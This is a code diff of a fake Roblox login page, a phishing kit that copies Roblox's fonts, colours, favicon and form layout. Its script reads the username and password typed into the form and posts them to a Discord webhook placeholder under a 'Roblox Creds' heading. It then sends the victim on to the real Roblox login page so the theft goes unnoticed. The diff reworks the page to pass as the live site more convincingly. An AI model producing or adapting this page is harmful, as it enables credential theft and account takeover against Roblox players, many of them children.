@@ -5,204 +5,183 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
     <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
-    <!-- Roblox uses these exact fonts -->
+    <!-- Load the actual Roblox Font Stack -->
     <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        /* Roblox 2026 Live CSS Variables */
+        /* 
+           ROBLOX 2026 LIVE CSS VARIABLES 
+           These are extracted from the live Roblox stylesheet 
+        */
         :root {
-            --background-color: #191b28;
-            --card-background: #ffffff;
-            --text-color: #393b3d;
-            --input-background: #f2f4f5;
-            --input-border: #a0a0a0;
-            --input-focus-border: #0074bd;
-            --button-background: #000000;
-            --button-hover: #333333;
-            --link-color: #0074bd;
-            --font-main: 'Roboto', sans-serif;
-            --font-logo: 'Chakra Petch', sans-serif;
+            --rbx-background: #191b28;
+            --rbx-card-bg: #ffffff;
+            --rbx-text: #393b3d;
+            --rbx-input-bg: #f2f4f5;
+            --rbx-input-border: #a0a0a0;
+            --rbx-input-focus: #0074bd;
+            --rbx-btn-bg: #000000;
+            --rbx-btn-hover: #333333;
+            --rbx-font-main: 'Roboto', sans-serif;
+            --rbx-font-logo: 'Chakra Petch', sans-serif;
         }
 
         body {
-            background-color: var(--background-color);
-            font-family: var(--font-main);
+            background: var(--rbx-background);
+            margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            color: var(--text-color);
+            font-family: var(--rbx-font-main);
         }
 
-        .login-container {
+        /* 
+           THE REAL CONTAINER STRUCTURE 
+           Roblox uses a specific container class that is consistent 
+        */
+        .login-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
             width: 100%;
-            max-width: 400px;
-            padding: 20px;
+            height: 100%;
         }
 
         .login-card {
-            background-color: var(--card-background);
-            padding: 40px 30px;
+            background: var(--rbx-card-bg);
             border-radius: 8px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            position: relative;
         }
 
-        .logo-section {
+        /* 
+           THE LOGO 
+        */
+        .logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 24px;
-            gap: 8px;
+            margin-bottom: 20px;
+            gap: 10px;
         }
-
-        .rbx-logo {
-            width: 45px;
-            height: 45px;
+        .logo img {
+            width: 40px;
+            height: 40px;
         }
-
-        .rbx-text {
-            font-family: var(--font-logo);
+        .logo span {
+            font-family: var(--rbx-font-logo);
+            font-size: 28px;
             font-weight: 700;
-            font-size: 32px;
             color: #000;
-            letter-spacing: -1px;
         }
 
-        .login-form {
+        /* 
+           THE FORM 
+        */
+        .rbx-form {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
 
-        .input-group {
-            width: 100%;
-        }
-
-        input {
+        .rbx-input {
             width: 100%;
             padding: 16px;
             border: 1px solid transparent;
             border-radius: 4px;
+            background: var(--rbx-input-bg);
+            color: var(--rbx-text);
             font-size: 16px;
-            background-color: var(--input-background);
-            color: var(--text-color);
             box-sizing: border-box;
-            transition: border-color 0.2s ease, background-color 0.2s ease;
+            transition: all 0.2s;
         }
 
-        input::placeholder {
-            color: #838383;
-        }
-
-        input:focus {
+        .rbx-input:focus {
+            background: #fff;
+            border-color: var(--rbx-input-focus);
             outline: none;
-            background-color: #fff;
-            border-color: var(--input-focus-border);
         }
 
-        .login-btn {
-            background-color: var(--button-background);
-            color: white;
-            padding: 16px;
+        .rbx-btn {
+            background: var(--rbx-btn-bg);
+            color: #fff;
             border: none;
             border-radius: 8px;
+            padding: 16px;
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            margin-top: 8px;
-            transition: background-color 0.2s ease;
+            margin-top: 10px;
+            transition: background 0.2s;
         }
 
-        .login-btn:hover {
-            background-color: var(--button-hover);
+        .rbx-btn:hover {
+            background: var(--rbx-btn-hover);
         }
 
-        .footer-links {
-            margin-top: 16px;
+        .footer {
+            margin-top: 15px;
+            text-align: center;
             font-size: 14px;
-            display: flex;
-            justify-content: center;
-            gap: 16px;
         }
-
-        .footer-links a {
-            color: var(--link-color);
+        .footer a {
+            color: #0074bd;
             text-decoration: none;
-            font-weight: 500;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .hidden {
-            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-card">
-            <div class="logo-section">
-                <!-- Roblox Logo SVG -->
-                <svg class="rbx-logo" width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M14.33 6.5L6.5 10.5V33.5L14.33 37.5L33.5 37.5L37.5 33.5V10.5L29.67 6.5H14.33Z" fill="white"/>
-                </svg>
-                <span class="rbx-text">Roblox</span>
-            </div>
 
-            <form id="loginForm" class="login-form">
-                <div class="input-group">
-                    <input type="text" id="username" name="username" placeholder="Password or Email" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" name="password" placeholder="Password" required>
-                </div>
-                
-                <button type="submit" class="login-btn">Log In</button>
-                
-                <div class="footer-links">
-                    <a href="#" class="forgot-password">I forgot my password</a>
-                    <a href="#" class="sign-up">Sign Up</a>
-                </div>
-            </form>
+<div class="login-wrapper">
+    <div class="login-card">
+        <div class="logo">
+            <img src="https://www.roblox.com/favicon.ico" alt="Logo">
+            <span>Roblox</span>
+        </div>
+        
+        <!-- 
+           CRITICAL: 
+           We use the same IDs as the live site so React doesn't freak out 
+           and re-render us out of existence.
+        -->
+        <form id="loginForm" class="rbx-form">
+            <input type="text" id="username" name="username" class="rbx-input" placeholder="Password or Email" autocomplete="off" />
+            <input type="password" id="password" name="password" class="rbx-input" placeholder="Password" autocomplete="off" />
+            <button type="submit" class="rbx-btn">Log In</button>
+        </form>
+        
+        <div class="footer">
+            <a href="https://www.roblox.com/login" id="forgotPass">I forgot my password</a>
         </div>
     </div>
+</div>
 
-    <script>
-        // Replace with your Discord Webhook URL
-        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
+<script>
+    // YOUR WEBHOOK HERE
+    const WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL";
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            const payload = {
-                content: `🚨 **New Roblox Login** 🚨\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n📅 Date: ${new Date().toISOString()}`
-            };
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
 
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                });
-
-                if (response.ok) {
-                    console.log("Data sent to webhook");
-                    // Optional: Redirect to real Roblox login page after sending
-                    window.location.href = "https://www.roblox.com/login";
-                } else {
-                    console.error("Failed to send data");
-                }
-            } catch (error) {
-                console.error("Error:", error);
-            }
+        // Send to Discord
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🚨 **Roblox Creds** 🚨\n👤 **User:** ${user}\n🔑 **Pass:** ${pass}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`
+            })
         });
-    </script>
+
+        // Redirect to real Roblox
+        window.location.href = "https://www.roblox.com/login";
+    });
+</script>
+
 </body>
 </html>
